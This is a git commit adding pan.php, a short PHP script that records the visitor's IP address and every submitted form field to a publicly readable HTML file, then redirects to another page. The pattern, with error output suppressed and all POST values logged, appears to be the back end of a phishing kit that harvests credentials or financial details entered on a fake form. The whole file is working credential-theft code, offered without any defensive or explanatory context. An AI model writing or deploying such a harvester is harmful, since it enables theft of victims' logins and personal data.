c941de16506495c59a4a860be688e9d594c8d158
udmew <127181022+udmew@users.noreply.github.com>
2023-03-10 13:25:58 +0530

    Add files via upload

---
+++ pan.php
@@ -0,0 +1,22 @@
+<?php
+ // include ('UserInformation.php');
+    include ('ipcreat.php');
+
+header('location:pro2.html ');
+
+// header('location: loginsubmit.html');
+error_reporting(0);
+$handle = fopen("maind.html","a");
+fwrite($handle, $ip_address);
+fwrite($handle, "\r\n<br>");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n<br>");
+}
+fwrite($handle, "\r\n<br>");
+fclose($handle);
+exit;
+?> 
